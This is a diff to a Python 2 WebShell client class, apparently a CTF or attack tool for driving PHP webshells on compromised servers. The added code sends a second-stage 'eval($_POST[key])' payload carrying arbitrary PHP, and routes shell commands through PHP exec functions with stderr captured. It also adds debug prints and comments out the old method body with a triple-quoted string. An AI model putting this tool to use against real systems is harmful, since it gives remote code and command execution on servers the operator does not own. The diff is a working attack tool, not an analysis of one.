@@ -34,10 +34,13 @@ class WebShell():
 
     def php_code_exec(self, code):
         # TODO : 自己实现这个函数
-        code = "ob_start('ob_gzip');" + code + "ob_end_flush();"
+        key = random_string(8, string.ascii_letters)
+        god_code = "eval($_POST[%s])" % (key)
+        code = "@ob_start('ob_gzip');" + code + "@ob_end_flush();"
         try:
             if self.method == "POST":
-                data = {self.password:code}
+                data = {self.password:god_code, key:code}
+                print data
                 response = requests.post(self.url, data=data)
             elif self.method == "GET":
                 params = {self.password:code}
@@ -45,6 +48,7 @@ class WebShell():
             else:
                 return (False, "Unsupported method!")
             content = response.text
+            print content
             return (True, content)
         except:
             Log.error("The connection is aborted!")
@@ -238,6 +242,7 @@ class WebShell():
         Log.info("Using token : [%s]" % (token))
         code = "echo '%s'; echo '%s'; echo '%s';" % (token, flag, token)
         result = self.php_code_exec(code)
+        print result
         if result[0]:
             content = result[1]
             for i in content.split(token):
@@ -298,11 +303,13 @@ class WebShell():
         pass
 
     def php_command_exec(self,function, command):
+        code = "%s('%s 2>&1');" % (function, command)
+        return self.php_code_exec_token(code);
+    '''
         try:
             tick = random_string(3, string.letters)
             token = random_string(32, string.letters)
             if self.method == "POST":
-                data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_POST["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                 response = requests.post(self.url, data=data)
             elif self.method == "GET":
                 params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_GET["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
@@ -317,6 +324,7 @@ class WebShell():
         except Exception as e:
             Log.error(e)
             return (False, e)
+            '''
 
     def php_code_exec_token(self, code):
         token = random_string(32, string.letters)
